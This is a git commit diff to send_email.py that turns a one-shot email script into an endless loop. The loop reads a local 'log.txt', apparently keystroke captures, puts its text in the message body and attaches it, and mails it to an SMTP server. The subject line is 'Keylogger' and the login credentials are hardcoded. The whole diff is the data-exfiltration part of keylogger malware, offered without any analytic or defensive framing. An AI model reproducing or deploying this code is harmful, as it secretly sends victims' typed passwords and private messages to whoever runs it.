3a69356905790c2d75f59e9876fee1f21ef463f4
Nguyễn Quang Hưng <105227731+QuangHuwngg@users.noreply.github.com>
2024-01-12 07:09:40 +0700

    Add files via upload

--- send_email.py
+++ send_email.py
@@ -3,35 +3,39 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
+import time
 
-email_user = '4a2a9491d68ef5'
-email_password = 'f72e052a479331'
-email_send = 'sandbox.smtp.mailtrap.io'
-subject = 'Keylogger'
 
-msg = MIMEMultipart()
-msg['From'] = email_user
-msg['To'] = email_send
-msg['Subject'] = subject
-#put any body you like
-# f = open('a.txt', 'r')
-# str= f.read()
-body = 'abc'
-msg.attach(MIMEText(body,'plain'))
+while True:
+    # time.sleep(15)
+    email_user = '4a2a9491d68ef5'
+    email_password = 'f72e052a479331'
+    email_send = 'sandbox.smtp.mailtrap.io'
+    subject = 'Keylogger'
 
-filename='file.log'
-attachment  =open(filename,'rb')
+    msg = MIMEMultipart()
+    msg['From'] = email_user
+    msg['To'] = email_send
+    msg['Subject'] = subject
+    #put any body you like
+    f = open('log.txt', 'r')
+    str= f.read()
+    body = str
+    msg.attach(MIMEText(body,'plain'))
 
-part = MIMEBase('application','octet-stream')
-part.set_payload((attachment).read())
-encoders.encode_base64(part)
-part.add_header('Content-Disposition',"attachment; filename= "+filename)
+    filename='log.txt'
+    attachment  =open(filename,'rb')
 
-msg.attach(part)
-text = msg.as_string()
-server = smtplib.SMTP('sandbox.smtp.mailtrap.io',2525)
-server.starttls()
-server.login(email_user,email_password)
+    part = MIMEBase('application','octet-stream')
+    part.set_payload((attachment).read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition',"attachment; filename= "+filename)
 
-server.sendmail(email_user,email_send,text)
-server.quit()
+    msg.attach(part)
+    text = msg.as_string()
+    server = smtplib.SMTP('sandbox.smtp.mailtrap.io',2525)
+    server.starttls()
+    server.login(email_user,email_password)
+
+    server.sendmail(email_user,email_send,text)
+    server.quit()
